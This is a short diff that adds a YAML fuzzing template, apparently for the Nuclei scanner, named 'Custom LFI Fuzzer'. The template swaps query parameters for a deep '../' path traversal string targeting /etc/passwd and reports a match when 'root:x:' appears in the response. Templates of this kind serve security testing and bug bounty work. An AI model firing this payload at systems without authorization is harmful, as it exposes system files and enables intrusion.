@@ -1,0 +1,27 @@
+id: LFI-Fuzzzer
+
+info:
+  name: Custom LFI Fuzzer
+  author: SirBugs
+  severity: high
+  tags: lfi
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    payloads:
+      reflection:
+        - "../../../../../../../../../../../../../../../../../../etc/passwd"
+    stop-at-first-match: true
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:x:"
